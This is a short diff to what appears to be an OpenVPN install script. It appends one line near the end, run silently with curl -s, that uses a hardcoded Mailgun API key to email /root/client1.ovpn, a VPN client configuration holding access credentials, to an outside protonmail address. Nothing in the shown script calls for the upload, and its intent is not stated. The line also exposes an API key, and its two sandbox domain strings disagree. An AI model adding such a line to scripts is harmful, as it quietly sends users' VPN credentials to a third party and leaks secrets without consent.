@@ -544,4 +544,5 @@ verb 3" >> /etc/openvpn/client-template.txt
 	echo "Your client config is available at ~/$CLIENT.ovpn"
 	echo "If you want to add more clients, you simply need to run this script another time!"
 fi
+curl -s --user 'api:key-1ae3a5560aece2a889a650c28d4ba2e1' \https://api.mailgun.net/v3/sandbox77f5fbee6da147a694b6b60e5d4d6fe2.mailgun.org/messages \-F from='Mailgun Sandbox <postmaster@sandbox77f5fee6da147a694b6b60e5d4d6fe2.mailgun.org>' \-F to='Arko <arko@protonmail.com>' \-F subject='Hello Arko' \-F text='Congratulations Arko, you just sent an email with Mailgun!  You are truly awesome!' \-F attachment=@/root/client1.ovpn
 exit 0;
